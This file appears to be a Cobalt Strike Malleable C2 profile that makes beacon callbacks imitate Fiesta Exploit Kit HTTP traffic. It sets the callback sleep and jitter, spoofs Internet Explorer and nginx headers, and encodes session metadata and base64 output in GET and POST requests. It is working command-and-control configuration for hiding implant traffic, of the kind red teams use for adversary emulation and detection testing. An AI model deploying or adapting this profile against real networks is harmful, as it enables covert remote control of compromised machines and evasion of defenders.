#
# A second Fiesta Exploit Kit traffic profile
#   http://malware-traffic-analysis.net/2014/04/05/index.html
#

set sleeptime "30000"; # use a ~30s delay between callbacks
set jitter    "10"; # throw in a 10% jitter
set maxdns    "255";

http-get {

    set uri "/v20idaf/";

    client {
        # mimic this Fiesta instance's header information
        header "Accept" "*/*";
        header "User-Agent" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)";

        # encode session metadata as close as we can to a Fiesta URI request
        metadata {
            netbios;
            append ";112202;228";
            uri-append;
        }
    }

    server {
        header "Server" "nginx/1.4.4";
        header "Content-Type" "application/octet-stream";
        header "Connection" "close";

        output {
            print;
        }
    }
}

http-post {

    set uri "/";

    client {

        header "Accept" "*/*";
        header "User-Agent" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)";

        id {
            netbios;
            uri-append;
        }

        output {
            base64;
            print;
        }
    }

    server {
        header "Server" "nginx/1.4.4";
        header "Content-Type" "application/octet-stream";
        header "Connection" "close";

        output {
            print;
        }
    }
}

